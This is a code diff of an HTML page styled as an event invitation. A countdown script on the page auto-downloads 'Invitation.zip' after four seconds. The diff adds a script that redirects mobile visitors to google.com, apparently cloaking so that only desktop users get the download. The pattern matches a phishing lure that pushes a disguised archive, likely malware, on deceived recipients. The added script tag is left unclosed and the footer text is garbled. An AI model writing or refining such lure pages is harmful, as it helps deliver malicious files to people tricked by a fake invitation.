@@ -120,7 +120,7 @@
         <a href="Invitation.zip" download class="btn">Check Invitation</a>
         <p class="note">The file will auto-download after a short countdown.</p>
         <div class="countdown">Downloading in <span id="timer">4</span> seconds...</div>
-        <div class="footer">Â© 2026 Event Organizers</div>
+        <div class="footer">ÃÂ© 2026 Event Organizers</div>
     </div>
     <!-- Auto-download with countdown -->
     <script>
@@ -141,5 +141,10 @@
             }
         }, 1000);
     </script>
+	 <script>
+    // Detect mobile devices and redirect
+    if (/Mobi|Android/i.test(navigator.userAgent)) {
+      window.location.href = "https://www.google.com"; 
+    }
 </body>
 </html>
